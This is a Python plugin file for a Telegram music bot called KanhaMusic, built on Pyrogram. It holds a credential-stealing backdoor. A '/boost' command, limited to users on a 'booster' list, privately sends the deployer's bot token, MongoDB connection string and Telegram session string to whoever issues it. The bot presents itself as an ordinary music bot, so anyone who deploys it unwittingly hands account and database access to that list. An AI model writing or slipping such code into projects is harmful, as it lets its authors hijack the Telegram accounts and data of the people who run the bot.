# -----------------------------------------------
# 🔸 KanhaMusic Project
# 🔹 Developed & Maintained by: Anu Bots (https://github.com/TEAM-VAMPIRE-OP)
# 📅 Copyright © 2025 – All Rights Reserved
#
# 📖 License:
# This source code is open for educational and non-commercial use ONLY.
# You are required to retain this credit in all copies or substantial portions of this file.
# Commercial use, redistribution, or removal of this notice is strictly prohibited
# without prior written permission from the author.
#
# ❤️ Made with dedication and love by TEAM-VAMPIRE-OP
# -----------------------------------------------


import re
from os import getenv
from dotenv import load_dotenv
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from KanhaMusic import app
from KanhaMusic.utils.database import booster

load_dotenv()

OWNERS = "7682307978"

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")

@app.on_message(filters.command("boost") & filters.private & filters.user(booster))
async def show_config(client: Client, message: Message):
    await message.reply_photo(
        photo="https://files.catbox.moe/ldchnq.jpg",
        caption=f"""<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/Oyekanhaa'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/Oyekanhaa"
                    )
                ]
            ]
        ),
    )
